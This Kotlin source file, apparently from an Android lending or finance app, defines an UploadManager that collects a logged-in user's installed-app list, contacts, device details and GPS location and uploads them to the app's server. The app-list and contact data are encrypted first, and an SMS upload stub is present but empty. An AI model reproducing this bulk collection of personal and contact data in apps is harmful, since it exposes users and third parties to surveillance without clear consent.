package com.de.danaemas.util.upload

import android.Manifest
import android.location.Location
import android.util.Log
import com.alibaba.fastjson.JSONArray
import com.alibaba.fastjson.JSONObject
import com.coupang.common.network.ParameterTool
import com.coupang.common.user.UserManager
import com.coupang.common.utils.spf.SpConfig
import com.de.danaemas.AppApi
import com.de.danaemas.MyApplication
import com.de.danaemas.config.ConstantConfig.TYPE_APP
import com.de.danaemas.config.ConstantConfig.TYPE_CONTACT
import com.de.danaemas.event.LocationCall
import com.de.danaemas.event.LocationTool
import com.de.danaemas.util.EventUtil
import com.de.danaemas.util.JsonUtil
import com.de.danaemas.util.PermissionUtil
import com.de.danaemas.util.upload.app.RXGetAppInfo
import io.reactivex.android.schedulers.AndroidSchedulers
import io.reactivex.functions.Consumer
import io.reactivex.schedulers.Schedulers
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.*

/**
 *
 * @ProjectName:    Business
 * @Package:        com.alan.business.util.upload
 * @ClassName:      UploadManager
 * @Description:     java类作用描述
 * @Author:         jtao
 * @CreateDate:     2021/4/19 7:01 PM
 * @UpdateUser:     更新者
 * @UpdateDate:     2021/4/19 7:01 PM
 * @UpdateRemark:   更新说明
 * @Version:        1.0
 */
object UploadManager{

    /**
     * 上传所有信息
     */
    fun uploadAllInfo(){
        if (!UserManager.isLogin())
            return
        uploadAppList()
        uploadSMS()
        uploadContacts()
        uploadLunDuInfo()
        uploadDevicesDetail()
        uploadDevicesReport()
        upLoadLocation()
    }

    /**
     * appList
     */
    fun uploadAppList(){
        RXGetAppInfo.getAppInfoList(MyApplication.baseCox()!!,object : RXGetAppInfo.InfoDataCallBack<ArrayList<AppInfoBean>>{
            override fun infoCallBack(dataObject: ArrayList<AppInfoBean>) {
                val uploadData = dataObject as ArrayList<AppInfoBean>
                CoroutineScope(Dispatchers.Main).launch {
                    AppApi.api.upLoadContents(DataAESUtil.encrypt(JsonUtil.toJsonString(uploadData)),0, TYPE_APP)
                }
            }
        })
    }

    /**
     * 上传短信
     */
    fun uploadSMS(){
    }

    /**
     * 上传联系人
     */
    fun uploadContacts(){
        if(!PermissionUtil.checkPermission(MyApplication.baseCox()!!, Manifest.permission.READ_CONTACTS)){
            return
        }
        RXGetAppInfo.getContactsList(MyApplication.baseCox()!!,object : RXGetAppInfo.InfoDataCallBack<JSONArray>{
            override fun infoCallBack(dataObject: JSONArray) {
                CoroutineScope(Dispatchers.Main).launch {
                    AppApi.api.upLoadContents(DataAESUtil.encrypt(JsonUtil.toJsonString(dataObject)),0, TYPE_CONTACT)
                }
            }
        })
    }

    /**
     * 上传轮渡信息
     */
    fun uploadLunDuInfo(){
        RXGetAppInfo.getLunDuInfo(MyApplication.baseCox()!!,object : RXGetAppInfo.InfoDataCallBack<JSONObject>{
            override fun infoCallBack(dataObject: JSONObject) {
                CoroutineScope(Dispatchers.Main).launch {
                    AppApi.api.uploadLunDuInfo(dataObject)
                }
            }
        })
    }

    /**
     * 上传场景设备信息
     */
    fun uploadDevicesDetail(){
        RXGetAppInfo.getMyDevicesDetail(MyApplication.baseCox()!!,object : RXGetAppInfo.InfoDataCallBack<DeviceInfoBean>{
            override fun infoCallBack(dataObject: DeviceInfoBean) {
                CoroutineScope(Dispatchers.Main).launch {
                    AppApi.api.uploadDevicesDetail(ParameterTool.toRequestBody(JsonUtil.toJsonString(dataObject)))
                }
            }
        })
    }

    /**
     * 上传设备信息
     */
    fun uploadDevicesReport(){
        RXGetAppInfo.getDevicesReportInfo(MyApplication.baseCox()!!,object : RXGetAppInfo.InfoDataCallBack<JSONObject>{
            override fun infoCallBack(dataObject: JSONObject) {
                CoroutineScope(Dispatchers.Main).launch {
                    AppApi.api.uploadDevicesReport(ParameterTool.toRequestBody(dataObject))
                }
            }
        })
    }

    /**
     * 上传定位信息
     */
    fun upLoadLocation(){
        LocationTool.getInstance().startLocation(object :
            LocationCall {
            override fun error(errorMsg: String?) {
            }

            override fun location(
                location: Location?,
                addressDetail: String?,
                addressJson: String?
            ) {
                val map: MutableMap<String, Any> =
                    HashMap()
                val date = Date(location!!.time)
                val format =
                    SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
                map["longitude"] = location!!.longitude
                map["latitude"] = location!!.latitude
                map["address"] = addressDetail!!
                map["addressInfo"] = addressJson!!
                map["time"] = format.format(date)
                CoroutineScope(Dispatchers.Main).launch {
                    AppApi.api.uploadLocation(ParameterTool.toRequestBody(map))
                }
            }

        })
    }

    fun uploadGoogleMarket(){
//        if (SpConfig.nfur)
//            return
        RXGetAppInfo.getGoogleMarketInfo(MyApplication.baseCox()!!,object : RXGetAppInfo.InfoDataCallBack<Map<String,Any>>{
            override fun infoCallBack(dataObject: Map<String, Any>) {
                CoroutineScope(Dispatchers.Main).launch {
                    SpConfig.nfur = true
                    val result = AppApi.api.upLoadGoogleMarket(ParameterTool.toRequestBody(dataObject))
                    if (result.data != null && "1" == result.data?.getString("initEvent")){
                        Log.e("谷歌信息", "上传成功，初始化AF")
                        EventUtil.initAF()
                    }
                }
            }
        })
    }

}